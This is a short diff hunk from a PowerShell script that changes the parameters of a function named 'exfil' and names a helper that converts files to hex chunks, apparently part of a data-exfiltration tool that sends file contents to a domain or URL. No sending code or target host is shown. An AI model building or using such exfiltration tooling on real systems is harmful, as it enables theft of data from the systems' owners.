@@ -2,8 +2,8 @@ function exfil {
     param (
         [string]$regex,
         [string]$domain,
-        [string]$url,
-        [string]$filepath
+        [string]$url#,
+        #[string]$filepath
     )
 
 	function Convert-FileToHexChunks {
